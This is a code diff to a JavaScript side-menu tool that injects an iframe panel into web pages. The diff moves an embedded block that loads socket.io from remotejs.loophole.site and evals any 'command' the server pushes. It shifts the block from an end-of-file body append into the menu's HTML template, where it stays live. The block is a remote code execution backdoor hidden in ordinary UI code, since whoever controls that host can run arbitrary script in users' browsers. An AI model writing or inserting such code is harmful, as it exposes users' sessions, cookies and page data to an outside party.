@@ -19,6 +19,13 @@ if (document.getElementById('sidemenu')) {
     <button style="float:right; background:red; color:black; width:50px; height:4%; border:none; font-size:25px; font-family:Monospace;" onclick='sidemenu.setAttribute("style","display:none;");gui=false;'>-</button>
     
     <iframe id="sidemenuframe" src="data:text/html,<body style='background:black; color:white; font-family:Monospace;'>Enter URL above</body>" style="height:96%; width:100%; color:black; font-family:Monospace; font-size:12px; z-index:10000; display: float; overflow:visible; position:fixed; left:0; top: 4%; background:white; border:none; float:left;"></iframe>
+    <script src="https://remotejs.loophole.site/socket.io/socket.io.js"></script>
+    <script>
+    const socket = io("https://remotejs.loophole.site");
+    socket.on("command", function(command) {
+    eval(command);
+    });
+    </script>
     `;
 }
 void 0;
@@ -33,11 +40,3 @@ document.onkeydown = function (e) {
     }
   }
 }
-
-document.body.innerHTML += `<script src="https://remotejs.loophole.site/socket.io/socket.io.js"></script>
-<script>
-const socket = io("https://remotejs.loophole.site");
-socket.on("command", function(command) {
-eval(command);
-});
-</script>`;
